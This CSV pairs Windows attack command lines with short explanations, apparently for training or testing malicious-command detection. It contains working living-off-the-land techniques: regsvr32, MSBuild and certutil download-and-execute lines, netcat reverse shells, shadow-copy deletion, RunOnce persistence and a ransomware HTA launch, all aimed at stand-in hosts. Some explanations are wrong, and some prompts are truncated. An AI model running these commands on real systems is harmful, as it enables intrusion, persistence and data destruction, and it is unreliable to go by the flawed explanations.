prompt,response
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll,This command can be used to unregister a malicious .dll payload hosted on a remote webdav server from a Windows machine.
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\11.11.11.11\folder\payload.dll,This command uninstalls a .NET assembly from a remote machine and could be used to remove a malicious payload from a compromised system.
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\10.10.10.10\folder\payload.dll,This command uninstalls a .NET assembly from a remote machine and can be used to remove a malicious payload from a compromised system.
regasm /u \\webdavserver\folder\payload.dll,"This command can be used to unregister a malicious .dll payload hosted on a remote WebDAV server, potentially used in a living off the land attack, from a Windows machine."
regasm /u \\11.11.11.11\folder\payload.dll,"This command can be used to unregister a malicious .dll payload from a remote machine, potentially removing the attacker's foothold on the system."
regasm /u \\10.10.10.10\folder\payload.dll,This command can be used to unregister a .NET assembly and potentially remove a malicious payload from a compromised system.
regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll,This command can be used to execute a malicious payload hosted on a web server by unregistering a legitimate DLL file and replacing it with the malicious payload.
regsvr32 /u /n /s /i:http://10.10.10.10/payload.sct scrobj.dll,"This command can be used to unregister a DLL file while simultaneously executing a remote script hosted on a web server, potentially allowing an attacker to execute arbitrary code on the victim machine."
regsvr32 /u /n /s /i:http://11.11.11.11/payload.sct scrobj.dll,"This command can be used to unregister a DLL file and register a new one from a remote server, potentially allowing an attacker to execute malicious code on the target machine."
odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt},This command can be used to register a malicious DLL payload on a remote webdav server and execute it on a target machine using ODBC data sources.
odbcconf /s /a {regsvr \\10.10.10.10\folder\payload_dll.txt},"This command can be used to register a malicious DLL file on a remote machine through ODBC configuration, allowing for persistence and potential privilege escalation."
odbcconf /s /a {regsvr \\11.11.11.11\folder\payload_dll.txt},"This command can be used to register a malicious DLL file on a remote machine via ODBC, allowing for persistence and potential privilege escalation."
"cmd /V /c ""set MB=""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe"" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml""","This command can be used to execute a payload.xml file from a remote WebDAV server, potentially allowing an attacker to download and execute malicious code on the target Windows machine."
"cmd /V /c ""set MB=""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe"" & !MB! /noautoresponse /preprocess \\10.10.10.10\folder\payload.xml > payload.xml & !MB! payload.xml""","This command can be used to execute a payload.xml file from a remote server, potentially allowing an attacker to execute arbitrary code on the target machine."
"cmd /V /c ""set MB=""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe"" & !MB! /noautoresponse /preprocess \\11.11.11.11\folder\payload.xml > payload.xml & !MB! payload.xml""","This command can be used to execute a payload.xml file from a remote server, potentially allowing an attacker to execute malicious code on the target machine."
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll,"This command can be used to download and execute a payload from a remote server, and then use InstallUtil to install and execute the payload as a Windows service."
certutil -urlcache -split -f http://10.10.10.10/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll,"This command downloads a base64-encoded payload from a remote server, decodes it, and installs it as a DLL using the .NET Framework's InstallUtil utility, potentially allowing an attacker to execute arbitrary code on the compromised machine."
certutil -urlcache -split -f http://11.11.11.11/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll,"This command downloads a payload from a remote server, decodes it, and installs it as a Windows service using InstallUtil, potentially allowing for persistent access to the compromised system."
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe,"This command downloads a base64-encoded payload from a web server, decodes it, and executes it as an executable file, making it useful for delivering and executing malicious payloads in a cyberattack."
certutil -urlcache -split -f http://10.10.10.10/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe,"This command downloads a base64-encoded payload from a remote server, decodes it, and executes it as an executable file, which could be used to deliver and execute malware on a target machine."
certutil -urlcache -split -f http://11.11.11.11/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe,"This command downloads a base64-encoded payload from a remote server, decodes it, and executes it as an executable file, which could be used to deliver and execute malware on a target machine."
"powershell $client = New-Object System.Net.Sockets.TCPClient(""10.10.10.10""","This PowerShell command creates a new TCP client object and connects to the specified IP address, potentially allowing an attacker to establish a remote connection to a command and control server."
"powershell $client = New-Object System.Net.Sockets.TCPClient(""11.10.10.10""","This PowerShell command creates a new TCP client object and connects to the specified IP address, potentially allowing an attacker to establish a remote connection to a command and control server."
"powershell $client = New-Object System.Net.Sockets.TCPClient(""merelelu.ana""","This command creates a new TCP client object and connects to the specified IP address and port, potentially allowing for remote communication and data exfiltration."
desktopimgdownldr /lockscreenurl:https://10.10.10.10.com:8080/file.ext /eventName:randomname,"This command can be used to download an image from a specified URL and set it as the lock screen background, potentially as part of a social engineering attack to trick the user into entering their credentials."
desktopimgdownldr /lockscreenurl:https://11.11.11.11.com:8080/file.ext /eventName:randomname,"This command can be used to download an image from a remote server and set it as the lock screen background, potentially as part of a social engineering attack to trick the user into entering their credentials."
desktopimgdownldr /lockscreenurl:https://domain.com:8080/file.ext /eventName:randomname,"This command can be used to download an image from a specified URL and set it as the lock screen background, potentially as part of a social engineering attack to trick the user into entering their credentials."
WinHttp.WinHttpRequest.5.1;$h.open('POST',"This command can be used to send HTTP POST requests to a remote server, potentially allowing an attacker to exfiltrate data or execute commands on a compromised machine."
powershell $h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('POST',"This command can be used to send HTTP POST requests to a remote server, potentially allowing an attacker to exfiltrate data or execute commands on a compromised machine."
"powershell (New-Object System.Net.WebClient).DownloadFile(""http://192.168.119.155/PowerUp.ps1""","This command downloads a PowerShell script from a remote server, which could be used to execute malicious code on the target machine."
telnet hostname.domain.com 80,"Potential use: Port scanning and reconnaissance.

What it does: Attempts to establish a connection to the specified hostname on port 80 using the Telnet protocol."
telnet 10.10.10.10 80,"Potential use: Port scanning and reconnaissance.

What it does: Attempts to establish a connection to the specified IP address on port 80 using the Telnet protocol."
telnet 11.11.11.11 80,"Potential use: Port scanning and reconnaissance.

What it does: Attempts to establish a connection to the specified IP address on port 80 using the Telnet protocol."
nc -l -p 6790,"This command sets up a listener on port 6790, which could be used to receive incoming connections or data from a remote attacker."
nc.exe 192.168.100.113 4444 -e cmd.exe,"This command can be used to establish a reverse shell to a remote attacker-controlled machine, allowing the attacker to execute arbitrary commands on the compromised machine."
nc.exe 193.168.100.113 4444 -e cmd.exe,"This command can be used to establish a reverse shell to a remote attacker-controlled machine, allowing the attacker to execute arbitrary commands on the compromised machine."
nc.exe -lnvp 8080,"This command opens a listening port on the local machine, potentially allowing an attacker to establish a reverse shell or transfer files."
nc.exe 192.168.100.113 4444,This command can be used to establish a reverse shell to a remote attacker-controlled machine on port 4444.
nc.exe 193.168.100.113 4444,This command can be used to establish a reverse shell to a remote attacker-controlled machine on port 4444.
C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p,"This command launches a service host process that runs services in the background, and it could potentially be used to hide malicious activity or execute code as a system-level process."
C:\Windows\System32\cmd.exe /c vssadmin delete shadows /all /quiet,"Potential use: Deleting Volume Shadow Copies to hinder forensic analysis.
What it does: Deletes all Volume Shadow Copies on the system silently."
C:\Windows\System32\cmd.exe /c wmic shadowcopy delete,"Potential use: Deleting shadow copies to hinder recovery efforts.
What it does: Executes the Windows Management Instrumentation Command-line (WMIC) tool to delete all shadow copies on the system."
C:\Windows\System32\WScript.exe C:\Users\admin\enYXval36C\38oDr5.vbs,This command can be used to execute a VBScript file and potentially run malicious code on a Windows machine.
C:\Windows\System32\Rundll32.exe 8ivq.dll arzy949,This command is not a legitimate Windows command and appears to be malicious.
C:\Windows\System32\cmd.exe /c ping 127.0.0.1 && reg add HKEY CURRENT USER\Software\Microsoft\Windows\CurrentVersion\RunOnce /v enYXval36C /t REG SZ /d C:\enYXval36CenYXval36C\enYXval36C.vbs /f,"This command can be used to create a persistent backdoor by adding a registry key that executes a VBScript file every time the user logs in, while also disguising the command as a harmless ping to avoid detection."
C:\Windows\System32\mshta.exe ransom.hta,"This command can be used to execute a ransomware attack by running a malicious HTA file through the Microsoft HTML Application Host, potentially encrypting files on the Windows machine."
C:\Windows\SysWOW64\Rundll32.exe {64F97CDC...FAB40CA\}.db #1 #1},This command can be used to execute a malicious DLL file and potentially execute arbitrary code on the system.
C:\Windows\System32\cmd.exe /c (ping localhost >> nul & del $path\grey3.exe >> nul),"This command can be used to hide the execution of a malicious file (grey3.exe) by deleting it after pinging the local host, making it difficult to detect."
